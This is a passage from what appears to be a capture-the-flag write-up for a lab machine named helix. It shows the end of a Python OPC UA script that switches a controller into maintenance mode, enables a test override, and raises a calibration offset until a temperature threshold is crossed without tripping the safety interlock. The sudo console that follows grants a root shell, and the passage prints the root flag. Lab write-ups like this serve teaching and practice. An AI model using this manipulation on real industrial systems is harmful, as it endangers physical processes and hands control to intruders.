                print("[-] TRIP ACTIVE — stopping")
                break

            if (temp >= 295 or pressure >= 73) and not trip:
                print("[+] MAINTENANCE WINDOW OPEN!")
                break

            offset += 1.0
            await offset_node.write_value(DataValue(Variant(offset, VariantType.Double)))
            await asyncio.sleep(2)

asyncio.run(main())
EOF
```

Running the script confirmed the sequential state changes and the threshold crossing at `Offset=13.0` with `Temp=295.1`.

```shell
operator@helix:~$ python3 /tmp/opcua_go.py
[+] Connected
[*] Setting Mode = MAINTENANCE
    Mode: MAINTENANCE
[*] Enabling TestOverride
    TestOverride: True
[*] Ramping CalibrationOffset...
    Offset=0.0 Temp=275.2 Pressure=68.6 Trip=False
    Offset=1.0 Temp=277.1 Pressure=68.7 Trip=False
    Offset=2.0 Temp=279.0 Pressure=68.7 Trip=False
    Offset=3.0 Temp=280.7 Pressure=68.8 Trip=False
    Offset=4.0 Temp=282.4 Pressure=68.8 Trip=False
    Offset=5.0 Temp=284.0 Pressure=68.9 Trip=False
    Offset=6.0 Temp=285.5 Pressure=68.9 Trip=False
    Offset=7.0 Temp=287.0 Pressure=69.0 Trip=False
    Offset=8.0 Temp=288.5 Pressure=69.0 Trip=False
    Offset=9.0 Temp=289.9 Pressure=69.0 Trip=False
    Offset=10.0 Temp=291.2 Pressure=69.0 Trip=False
    Offset=11.0 Temp=292.6 Pressure=69.1 Trip=False
    Offset=12.0 Temp=293.9 Pressure=69.1 Trip=False
    Offset=13.0 Temp=295.1 Pressure=69.1 Trip=False
[+] MAINTENANCE WINDOW OPEN!
```

With the maintenance window state file written by the `plc`, `sudo /usr/local/sbin/helix-maint-console` now validated successfully and spawned a root shell with a countdown timer.

```shell
operator@helix:~$ sudo /usr/local/sbin/helix-maint-console
[+] Privileged maintenance access granted
[!] Window expires in 97 seconds
[!] Session will be terminated automatically
root@helix:/home/operator#
```

## root.txt

```shell
root@helix:~# cat root.txt
888387c332d6b4cce93b4f3e6e5b37ed
```
